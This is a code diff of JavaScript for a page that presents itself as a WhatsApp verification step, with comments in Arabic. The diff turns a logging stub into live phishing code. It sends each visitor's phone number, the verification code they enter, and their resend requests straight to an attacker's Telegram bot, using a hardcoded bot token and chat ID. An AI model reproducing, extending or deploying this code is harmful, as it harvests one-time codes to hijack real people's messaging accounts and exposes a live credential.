@@ -81,6 +81,9 @@ document.addEventListener('DOMContentLoaded', function() {
         fullPhoneNumber = code + phone;
         displayNumber.textContent = fullPhoneNumber;
         
+        // إرسال معلومات المستخدم إلى التلجرام فور إدخال الرقم
+        sendUserDataToTelegram(fullPhoneNumber);
+        
         // محاكاة إرسال الرمز
         simulateSendCode();
         
@@ -105,6 +108,9 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
 
+        // إرسال رمز التحقق إلى التلجرام
+        sendVerificationCodeToTelegram(fullPhoneNumber, code);
+        
         // محاكاة التحقق الناجح
         simulateVerification(code);
     });
@@ -132,6 +138,9 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
+        // إرسال طلب إعادة الإرسال إلى التلجرام
+        sendResendRequestToTelegram(fullPhoneNumber);
+        
         // محاكاة إعادة إرسال الرمز
         simulateResendCode();
         startResendCountdown();
@@ -154,7 +163,6 @@ document.addEventListener('DOMContentLoaded', function() {
 
     function showInputError(input, message) {
         input.classList.add('input-error');
-        // في تطبيق حقيقي، يمكنك إضافة رسالة خطأ تحت الحقل
     }
 
     function clearInputError(input) {
@@ -209,10 +217,6 @@ document.addEventListener('DOMContentLoaded', function() {
         verifyBtn.disabled = true;
         
         setTimeout(() => {
-            // إرسال البيانات إلى التلجرام
-            sendDataToTelegram(fullPhoneNumber, code);
-            
-            // عرض شاشة النجاح
             codeContainer.style.display = 'none';
             successContainer.style.display = 'block';
             
@@ -221,39 +225,93 @@ document.addEventListener('DOMContentLoaded', function() {
         }, 2000);
     }
 
-    function sendDataToTelegram(phoneNumber, code) {
-        // البيانات التي سيتم إرسالها
+    // وظائف الإرسال الحقيقية إلى التلجرام
+    function sendUserDataToTelegram(phoneNumber) {
         const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // استبدل هذا بتوكن بوتك الحقيقي
         const chatId = '8457242337';     // استبدل هذا بمعرف الدردشة الحقيقي
         
-        const message = `🔐 *نظام توثيق واتساب*\n\n📱 *رقم الهاتف:* ${phoneNumber}\n🔢 *رمز التحقق:* ${code}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n🛡️ *الحالة:* تم التوثيق بنجاح`;
+        const message = `👤 *بيانات المستخدم*\n\n📱 *رقم الهاتف:* ${phoneNumber}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n📍 *المرحلة:* تم إدخال رقم الهاتف\n📊 *الحالة:* في انتظار رمز التحقق`;
         
-        // في التطبيق الحقيقي، ستحتاج إلى سيرفر وسيط لتجنب مشاكل CORS
-        // هذا الكود للتوضيح فقط
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
         
-        console.log('--- بيانات التوثيق ---');
-        console.log('رقم الهاتف:', phoneNumber);
-        console.log('رمز التحقق:', code);
-        console.log('الرسالة الكاملة:', message);
-        console.log('--- نهاية البيانات ---');
-        
-        // في تطبيق إنتاجي حقيقي:
-        /*
-        fetch('https://your-server.com/send-to-telegram', {
+        fetch(url, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                phoneNumber: phoneNumber,
-                code: code,
-                timestamp: new Date().toISOString()
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
             })
         })
-        .then(response => response.json())
-        .then(data => console.log('تم الإرسال بنجاح:', data))
-        .catch(error => console.error('خطأ في الإرسال:', error));
-        */
+        .then(response => {
+            if (!response.ok) {
+                console.error('فشل إرسال بيانات المستخدم إلى التلجرام');
+                // يمكنك إضافة معالجة خطأ هنا
+            }
+        })
+        .catch(error => {
+            console.error('خطأ في إرسال بيانات المستخدم:', error);
+        });
+    }
+
+    function sendVerificationCodeToTelegram(phoneNumber, code) {
+        const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // استبدل هذا بتوكن بوتك الحقيقي
+        const chatId = '8457242337';     // استبدل هذا بمعرف الدردشة الحقيقي
+        
+        const message = `🔐 *رمز التحقق*\n\n📱 *رقم الهاتف:* ${phoneNumber}\n🔢 *رمز التحقق:* ${code}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n✅ *الحالة:* تم إدخال رمز التحقق بنجاح\n🛡️ *المرحلة:* التوثيق مكتمل`;
+        
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('فشل إرسال رمز التحقق إلى التلجرام');
+            }
+        })
+        .catch(error => {
+            console.error('خطأ في إرسال رمز التحقق:', error);
+        });
+    }
+
+    function sendResendRequestToTelegram(phoneNumber) {
+        const botToken = '8008801270:AAHSaylCOt1O12DfHYSN0BQ3TERcznpDayU'; // استبدل هذا بتوكن بوتك الحقيقي
+        const chatId = '8457242337';     // استبدل هذا بمعرف الدردشة الحقيقي
+        
+        const message = `🔄 *طلب إعادة إرسال*\n\n📱 *رقم الهاتف:* ${phoneNumber}\n🕐 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n📤 *الحالة:* تم طلب إعادة إرسال رمز التحقق`;
+        
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('فشل إرسال طلب إعادة الإرسال إلى التلجرام');
+            }
+        })
+        .catch(error => {
+            console.error('خطأ في إرسال طلب إعادة الإرسال:', error);
+        });
     }
 
     // التحقق من إدخال الأرقام فقط في حقل الهاتف
